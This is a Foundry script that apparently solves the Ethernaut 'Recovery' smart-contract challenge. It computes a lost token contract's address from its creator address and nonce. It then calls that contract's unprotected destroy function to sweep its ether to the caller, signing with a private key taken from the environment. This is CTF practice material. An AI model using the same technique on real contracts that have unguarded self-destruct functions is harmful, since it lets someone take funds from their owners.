// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../../src/Ethernaut/recovery.sol";

contract RecoveryScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address recoveryContractAddress = 0xD084aCF95262EDEAC41F15b4B150bc3cD3E8EB40;
        vm.startBroadcast(privateKey);

        // Calculate the address of the SimpleToken contract
        address simpleTokenAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            recoveryContractAddress,
                            bytes1(0x01) // nonce is 1 because it's the first contract created by Recovery
                        )
                    )
                )
            )
        );

        console2.log("Calculated SimpleToken address:", simpleTokenAddress);

        // Call the destroy function to recover the ether
        SimpleToken(payable(simpleTokenAddress)).destroy(payable(msg.sender));

        vm.stopBroadcast();
    }
}
